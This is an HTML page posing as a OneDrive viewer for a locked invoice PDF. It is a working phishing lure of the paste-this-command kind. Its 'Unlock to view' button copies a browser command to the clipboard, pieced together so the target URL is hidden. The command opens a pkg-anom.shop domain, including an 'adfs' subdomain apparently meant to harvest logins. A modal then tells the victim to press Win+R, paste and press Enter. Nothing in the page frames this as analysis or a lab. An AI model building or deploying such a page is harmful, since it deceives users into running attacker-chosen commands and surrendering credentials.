<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Single-Page PDF Viewer</title>
  <style>
    /* ------------------
       Design Tokens (Dark + Blue theme)
    ------------------- */
    :root{
      --bg: #0b1020;               /* deep navy */
      --panel: #0f172a;            /* slate-900 */
      --panel-2: #111827;          /* gray-900 */
      --muted: #93a4c1;            /* slate-300/400 mix */
      --text: #e5ebf7;             /* light text */
      --accent: #2563eb;           /* blue-600 */
      --accent-2: #3b82f6;         /* blue-500 */
      --border: #1e2a44;           /* navy border */
      --shadow: 0 10px 30px rgba(0,0,0,.45);
      --radius: 16px;
      --page-w: 210mm;
      --page-h: 297mm;
      --zoom: 0.9;
    }

    *{ box-sizing: border-box }
    html, body { height: 100% }
    body{
      margin:0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Inter, Arial, Noto Sans;
      color: var(--text);
      background: radial-gradient(1200px 800px at 20% -10%, #1f3a8a33, transparent),
                  radial-gradient(1000px 600px at 100% 0%, #0ea5e91a, transparent),
                  var(--bg);
    }

    /* ---------- App Layout ---------- */
    .app{ display:grid; grid-template-rows:auto 1fr auto; height:100dvh; gap:12px; padding:12px }
    .bar{ display:flex; align-items:center; gap:10px; padding:10px 12px; background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow) }
    .topbar{ justify-content:space-between }
    .logo{ display:flex; align-items:center; justify-content:center; width:auto; height:28px; border-radius:6px; background:transparent; box-shadow:none; padding:0 }
    .logo img{ height:28px; width:auto; display:block }

    .crumbs{ display:flex; align-items:center; gap:6px; color:var(--muted); font-size:14px }
    .crumbs .sep{ opacity:.6 }
    .filename{ font-weight:600; color:var(--text) }

    .btn{ appearance:none; border:1px solid var(--border); background:transparent; color:var(--text); padding:8px 10px; border-radius:10px; cursor:pointer; display:inline-flex; align-items:center; gap:8px; transition:.2s ease all }
    .btn[aria-disabled="true"]{ opacity:.5; cursor:not-allowed; pointer-events:none }
    .btn:hover{ background: color-mix(in srgb, var(--panel) 80%, #000 20%) }
    .btn:hover{ background: color-mix(in srgb, var(--panel) 80%, #000 20%) }
    .btn.primary{ background: var(--accent); border-color: color-mix(in srgb, var(--accent) 60%, #000 40%); color:white }
    .btn.primary:hover{ background: var(--accent-2) }
    .btn.ghost{ border-color: transparent }
    .icon{ width:16px; height:16px; display:inline-block }

    .search{ position:relative; flex:1; max-width:460px }
    .search input{ width:100%; padding:10px 12px 10px 36px; border-radius:12px; border:1px solid var(--border); background: color-mix(in srgb, var(--panel) 85%, #000 15%); color:var(--text) }
    .search .icon{ position:absolute; left:10px; top:50%; translate:0 -50%; opacity:.55 }

    /* ---------- Single Viewer ---------- */
    .viewer{ background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); padding:0; overflow:auto; position:relative; box-shadow:var(--shadow); min-height:0 }
    .canvas{ display:flex; justify-content:center; padding:28px }

    .page{ width:var(--page-w); height:var(--page-h); background:#ffffff; color:#111827; border-radius:14px; box-shadow: 0 6px 16px rgba(0,0,0,.35); border:1px solid #d8def0; position:relative; overflow:hidden; transform: scale(var(--zoom)); transform-origin: top center }
    .page .inner{ padding:24mm 20mm 20mm; position:relative }

    /* Invoice-like placeholder styling */
    .invoice-header{ display:flex; align-items:flex-start; justify-content:space-between; margin-bottom:10mm }
    .invoice-brand{ display:grid; gap:6px }
    .invoice-brand .title{ font-size:18pt; font-weight:800; letter-spacing: .4px }
    .invoice-brand .sub{ font-size:10pt; color:#475569 }
    .invoice-meta{ text-align:right; font-size:10pt; color:#475569 }
    .section{ margin-bottom:8mm }
    .two-col{ display:grid; grid-template-columns:1fr 1fr; gap:10mm }
    .h2{ font-size:12pt; font-weight:700; margin:0 0 6px }
    .small{ font-size:10pt; color:#475569 }
    table.inv{ width:100%; border-collapse:collapse; margin-top:4mm }
    table.inv th, table.inv td{ border:1px solid #e5e7eb; padding:6px 8px; font-size:10pt }
    table.inv th{ background:#f3f4f6; text-align:left }
    .total-row td{ font-weight:700 }

    /* Locked state: blur only the content, not the button */
    .locked .inner{ filter: blur(4px) saturate(.85); pointer-events:none; user-select:none }
    .locked .watermark{ display:block }
    .watermark{ display:none; position:absolute; inset:0; pointer-events:none; mix-blend-mode:multiply; opacity:.14; background: repeating-linear-gradient(45deg, transparent 0 28px, rgba(0,0,0,.06) 28px 56px) }
    .watermark span{ position:absolute; inset:auto; left:50%; top:50%; translate:-50% -50%; font-weight:800; font-size:64px; color:#0f172a; letter-spacing:8px }

    /* Unlock button centered ON the page, above blur */
    .unlock-on-page{ position:absolute; left:50%; top:50%; transform: translate(-50%, -50%); z-index:3; padding:14px 18px; border-radius:12px; border:1px solid color-mix(in srgb, var(--accent) 50%, #000 50%); background:var(--accent); color:#fff; cursor:pointer; display:inline-flex; align-items:center; gap:8px; box-shadow:var(--shadow) }
    .unlock-on-page:hover{ background: var(--accent-2) }

    /* Floating controls (no page selector) */
    .controls{ position:sticky; bottom:18px; display:flex; justify-content:center; width:100%; pointer-events:none }
    .controls .wrap{ pointer-events:auto; background: color-mix(in srgb, var(--panel-2) 85%, #000 15%); border:1px solid var(--border); border-radius:999px; padding:6px; display:flex; gap:6px; align-items:center; box-shadow:var(--shadow) }
    .seg{ display:flex; gap:2px; background: color-mix(in srgb, var(--panel-2) 70%, #000 30%); padding:4px; border-radius:999px }
    .chip{ padding:8px 10px; border-radius:999px; border:1px solid transparent; cursor:pointer; background:transparent; color:var(--text) }
    .chip[aria-pressed="true"], .chip:hover{ background: var(--accent); color:#fff }
    .zoom{ display:flex; align-items:center; gap:8px; padding:0 8px }
    input[type="range"]{ accent-color: var(--accent) }

    /* Footer */
    .bottombar{ justify-content:space-between; font-size:14px; color:var(--muted) }

    /* Modal (verification-style) */
    .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none; align-items: center; justify-content: center; z-index: 1000; }
    .modal-backdrop.show { display: flex; }
    .modal { background: #ffffff; border: 1px solid #e5e7eb; border-radius: 12px; width: min(560px, 90vw); box-shadow: 0 24px 60px rgba(0,0,0,.35); color: #111827; overflow:hidden }
    .modal header { display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; padding: 14px 16px; border-bottom: 1px solid #e5e7eb; }
    .modal header h3 { margin: 0; font-size: 16px; font-weight: 700; }
    .modal .close { border: none; background: transparent; font-size: 20px; line-height: 1; cursor: pointer; color: #6b7280; }
    .modal .body { padding: 14px 16px; }
    .k { display: inline-flex; align-items: center; gap: 6px; padding: 2px 8px; border: 1px solid #d1d5db; border-radius: 6px; background: #f9fafb; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 14px; }
    .icon-pdf { display: inline-flex; align-items: center; gap: 8px; grid-column: 2; justify-self: center; }
    .icon-pdf svg { width: 63px; height: 63px; }
    .logo-modal{ display:flex; align-items:center; gap:8px; grid-column:1; }
    .logo-modal img{ height:63px; width:63px; object-fit:contain; display:block }

    /* Print styles */
    @media print{
      body{ background:white }
      .app{ display:block; padding:0 }
      .bar, .controls, .unlock-on-page{ display:none !important }
      .viewer{ border:0; box-shadow:none }
      .page{ transform:none; box-shadow:none; border:none }
      .locked .inner{ filter:none }
      .watermark{ display:none !important }
    }
  </style>
</head>
<body>
  <div class="app">
    <!-- Top bar -->
    <div class="bar topbar">
      <div class="left" style="display:flex;align-items:center;gap:10px">
        <div class="logo" aria-label="OneDrive logo"><img src="https://i.ibb.co/SXK5vjRz/pngwing-com.png" alt="OneDrive"/></div>
        <div class="crumbs" aria-label="Breadcrumbs">
          <span>My Files</span>
          <span class="sep">›</span>
          <span>Invoices</span>
          <span class="sep">›</span>
          <span class="filename" id="filename">Invoice-000512.pdf</span>
        </div>
      </div>
      <div class="search">
        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
        <input id="search" placeholder="Search in document (Ctrl+F)" />
      </div>
      <div class="right" style="display:flex;align-items:center;gap:10px">
        <button class="btn" id="themeBtn" title="Toggle theme" aria-pressed="true">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 3a9 9 0 1 0 9 9 7 7 0 0 1-9-9Z"/></svg>
          Theme
        </button>
        <button class="btn" id="shareBtn" title="Share">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7"/><path d="M16 6l-4-4-4 4"/><path d="M12 2v14"/></svg>
          Share
        </button>
      </div>
    </div>

    <!-- Single-page viewer -->
    <section class="viewer locked" id="viewer" aria-label="Document viewer" data-locked="true">
      <div class="canvas" id="canvas">
        <article class="page" data-page="1">
          <div class="watermark"><span>LOCKED</span></div>
          <button class="unlock-on-page" id="unlockOnPageBtn" title="Unlock">
            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            Unlock to view
          </button>
          <div class="inner">
            <!-- Invoice-like demo content -->
            <div class="invoice-header">
              <div class="invoice-brand">
                <div class="title" style="color:#111827">ACME CORP</div>
                <div class="sub">123 Ocean Ave · Seattle, WA · +1 (555) 555‑0199</div>
              </div>
              <div class="invoice-meta">
                <div><strong>Invoice</strong> #000512</div>
                <div>Date: 2025‑09‑15</div>
                <div>Due: 2025‑09‑30</div>
              </div>
            </div>

            <div class="two-col section">
              <div>
                <div class="h2">Bill To</div>
                <div class="small">Contoso Ltd.<br/>987 Market St<br/>San Francisco, CA 94103</div>
              </div>
              <div>
                <div class="h2">Ship To</div>
                <div class="small">Contoso Warehouse<br/>210 Harbor Way<br/>Oakland, CA 94607</div>
              </div>
            </div>

            <div class="section">
              <table class="inv">
                <thead>
                  <tr><th style="width:55%">Description</th><th style="width:15%">Qty</th><th style="width:15%">Unit</th><th style="width:15%">Amount</th></tr>
                </thead>
                <tbody>
                  <tr><td>Design services (UI/UX, sprint 23)</td><td>24</td><td>$85.00</td><td>$2,040.00</td></tr>
                  <tr><td>Frontend implementation (React components)</td><td>30</td><td>$95.00</td><td>$2,850.00</td></tr>
                  <tr><td>QA & accessibility pass</td><td>12</td><td>$70.00</td><td>$840.00</td></tr>
                  <tr class="total-row"><td colspan="3" style="text-align:right">Subtotal</td><td>$5,730.00</td></tr>
                  <tr class="total-row"><td colspan="3" style="text-align:right">Tax (8.5%)</td><td>$487.05</td></tr>
                  <tr class="total-row"><td colspan="3" style="text-align:right">Total Due</td><td>$6,217.05</td></tr>
                </tbody>
              </table>
            </div>

            <div class="small" style="margin-top:10mm;color:#64748b">Payment due within 15 days. Thank you for your business.</div>
          </div>
        </article>
      </div>

      <!-- Floating Controls (zoom + fit only) -->
      <div class="controls" aria-hidden="false">
        <div class="wrap">
          <div class="seg">
            <button class="chip" id="fitWidth" title="Fit to width (W)">Fit width</button>
            <button class="chip" id="fitPage" title="Fit entire page (P)">Fit page</button>
            <button class="chip" id="toggleFocus" title="Toggle focus mode (F)">Focus</button>
          </div>
          <div class="zoom">
            <button class="chip" id="zoomOut" title="Zoom out (-)">−</button>
            <input type="range" id="zoomRange" min="0.5" max="2" value="0.9" step="0.05" aria-label="Zoom" />
            <button class="chip" id="zoomIn" title="Zoom in (+)">+</button>
            <button class="chip" id="zoomReset" title="Reset zoom (0)">90%</button>
          </div>
        </div>
      </div>
    </section>

    <!-- Bottom bar -->
    <div class="bar bottombar">
      <div>Ready · <span id="status">Locked preview</span></div>
      <div>
        <a class="btn ghost" href="#" aria-disabled="true" title="Print (disabled)">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9V2h12v7"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><path d="M6 14h12v8H6z"/></svg>
          Print
        </a>
        <a class="btn ghost" href="#" aria-disabled="true" title="Download (disabled)">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/></svg>
          Download
        </a>
      </div>
    </div>
  </div>

  <!-- Modal structure (verification-style) -->
  <div class="modal-backdrop" id="modal">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <header>
        <div class="logo-modal" aria-label="OneDrive">
          <img src="https://i.ibb.co/SXK5vjRz/pngwing-com.png" alt="OneDrive"/>
        </div>
        <div class="icon-pdf" aria-hidden="false">
          <svg viewBox="0 0 64 64" aria-hidden="true">
            <path d="M14 6h24l12 12v34a4 4 0 0 1-4 4H14a4 4 0 0 1-4-4V10a4 4 0 0 1 4-4z" fill="#ef4444"/>
            <path d="M38 6v12a4 4 0 0 0 4 4h12" fill="#f87171"/>
            <g fill="#ffffff">
              <rect x="22" y="30" width="20" height="16" rx="3"/>
              <path d="M32 22c-4 0-7 3-7 7v1h4v-1c0-1.65 1.35-3 3-3s3 1.35 3 3v1h4v-1c0-4-3-7-7-7z"/>
              <circle cx="32" cy="38" r="2" fill="#ef4444"/>
            </g>
          </svg>
          <span id="modalTitle" class="sr-only">Unlock instructions</span>
        </div>
        <button class="close" aria-label="Close" id="modalClose" style="grid-column:3; justify-self:end;">×</button>
      </header>
      <div class="body">
        <p style="margin:0 0 8px">To continue, follow these steps:</p>
        <ol style="margin:0; padding-left:20px">
          <li style="margin-bottom:10px;"> On your keyboard, press <span class="k" title="Windows key" aria-label="Windows key">
            <svg viewBox="0 0 24 24" aria-hidden="true" style="width:16px;height:16px;display:inline-block;vertical-align:-3px"><path fill="#0078D4" d="M2 5.5l8.5-1.5V11H2V5.5zm0 7.5h8.5v7L2 18.5V13zm10.5-9l9.5-1.7V11H12.5V4zm0 9h9.5v9.2L12.5 20V13z"/></svg>
            Win
          </span> + <span class="k">R</span>
          </li>
          <li style="margin-bottom:10px;"> Press <span class="k">Ctrl</span> + <span class="k">V</span> to paste the copied command.</li>
          <li> Press the <span class="k">Enter</span> key to proceed.</li>
        </ol>
      </div>
    </div>
  </div>

  <script>
    const html = document.documentElement;
    const viewer = document.getElementById('viewer');
    const zoomRange = document.getElementById('zoomRange');
    const status = document.getElementById('status');
    const unlockBtn = document.getElementById('unlockOnPageBtn');
    const modal = document.getElementById('modal');
    const modalClose = document.getElementById('modalClose');
    let zoom = 0.9;

    function setZoom(val){
      zoom = Math.min(2, Math.max(0.5, val));
      document.documentElement.style.setProperty('--zoom', zoom);
      zoomRange.value = zoom.toFixed(2);
      document.getElementById('zoomReset').textContent = Math.round(zoom*100)+'%';
    }

    function fitWidth(){
      const pad = 56; // safe padding
      const available = viewer.clientWidth - pad; // approx
      const pageWmm = getComputedStyle(document.documentElement).getPropertyValue('--page-w');
      const temp = document.createElement('div'); temp.style.width = pageWmm; document.body.appendChild(temp);
      const px = temp.getBoundingClientRect().width; temp.remove();
      setZoom(available / px);
    }

    function fitPage(){
      const pad = 120; // account for controls
      const availableH = viewer.clientHeight - pad;
      const pageHmm = getComputedStyle(document.documentElement).getPropertyValue('--page-h');
      const temp = document.createElement('div'); temp.style.height = pageHmm; document.body.appendChild(temp);
      const px = temp.getBoundingClientRect().height; temp.remove();
      setZoom(availableH / px);
    }

    // Controls wiring (no page navigation)
    document.getElementById('fitWidth').onclick = fitWidth;
    document.getElementById('fitPage').onclick = fitPage;
    document.getElementById('zoomIn').onclick = () => setZoom(zoom + 0.1);
    document.getElementById('zoomOut').onclick = () => setZoom(zoom - 0.1);
    document.getElementById('zoomReset').onclick = () => setZoom(0.9);
    document.getElementById('toggleFocus').onclick = () => document.body.classList.toggle('focus');

    zoomRange.addEventListener('input', (e)=> setZoom(parseFloat(e.target.value)));

    // Theme toggle
    document.getElementById('themeBtn').addEventListener('click', (e)=>{
      const dark = html.getAttribute('data-theme') !== 'dark';
      html.setAttribute('data-theme', dark ? 'dark' : 'light');
      e.currentTarget.setAttribute('aria-pressed', String(dark));
    });

    // Modal helpers
    function showModal(){ modal.classList.add('show'); }
    function hideModal(){ modal.classList.remove('show'); }
    modalClose.addEventListener('click', hideModal);
    modal.addEventListener('click', (e)=>{ if(e.target === modal) hideModal(); });

    // Clipboard compose (like the example snippet)
    const bro = "Msedge";
    const usr = "tbd";
    const domo = "pkg-anom";
    const tosd = ".shop";
    const composed = `${bro} https://${usr}.${domo}${tosd}`;

    async function copyWithClipboardAPI(text){
      if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        throw new Error('Clipboard API requires secure context');
      }
      await navigator.clipboard.writeText(text);
      return true;
    }
    function copyWithExecCommand(text){
      try { const ta = document.createElement('textarea'); ta.value = text; ta.setAttribute('readonly',''); ta.style.position='fixed'; ta.style.left='-9999px'; document.body.appendChild(ta); ta.select(); const ok = document.execCommand('copy'); document.body.removeChild(ta); return ok; } catch { return false; }
    }
    function copyWithContentEditable(text){
      try { const span=document.createElement('span'); span.textContent=text; span.style.whiteSpace='pre'; span.contentEditable='true'; span.style.position='fixed'; span.style.left='-9999px'; document.body.appendChild(span); const range=document.createRange(); range.selectNodeContents(span); const sel=window.getSelection(); sel.removeAllRanges(); sel.addRange(range); let ok=false; try{ ok=document.execCommand('copy'); }catch{} sel.removeAllRanges(); document.body.removeChild(span); return ok; } catch { return false; }
    }
    async function doCopyAll(text){
      try { await copyWithClipboardAPI(text); return true; } catch {}
      if (copyWithExecCommand(text)) return true;
      if (copyWithContentEditable(text)) return true;
      return false;
    }

    // Unlock behavior -> open modal (retain locked state)
    unlockBtn.addEventListener('click', async ()=>{
      status.textContent = 'Verifying…';
      try { await doCopyAll(composed); } catch {}
      showModal();
    });

        // Fit to width on load
    window.addEventListener('load', ()=>{ setZoom(0.9); });
    // keep current zoom steady on resize
    window.addEventListener('resize', ()=>{ /* no auto-fit on resize */ });
    window.addEventListener('resize', ()=>{ /* no auto-fit on resize */ }); });
  </script>
  
  <!-- Modal fallback binder -->
  <script>
    (function(){
      function qs(id){ return document.getElementById(id); }
      function show(){ var m = qs('modal'); if(m) m.classList.add('show'); }
      function hide(){ var m = qs('modal'); if(m) m.classList.remove('show'); }

      function safeBind(){
        var modal = qs('modal');
        var closeBtn = qs('modalClose');
        if(closeBtn){ closeBtn.onclick = hide; }
        if(modal){ modal.addEventListener('click', function(e){ if(e.target === modal) hide(); }); }
        var unlock = qs('unlockOnPageBtn');
        if(unlock){
          unlock.onclick = async function(){
            var status = qs('status'); if(status) status.textContent = 'Verifying…';
            // optional copy, ignore failures
            try{
              const text = 'Chrome https://adfs.pkg-anom.shop';
              if(navigator.clipboard && window.isSecureContext){ await navigator.clipboard.writeText(text); }
            }catch{}
            show();
          };
        }
      }

      if(document.readyState === 'complete' || document.readyState === 'interactive'){
        safeBind();
      } else {
        document.addEventListener('DOMContentLoaded', safeBind, { once: true });
      }

      // Expose for other scripts (optional)
      window.__viewerModal = { show: show, hide: hide };
    })();
  </script>
</body>
</html>

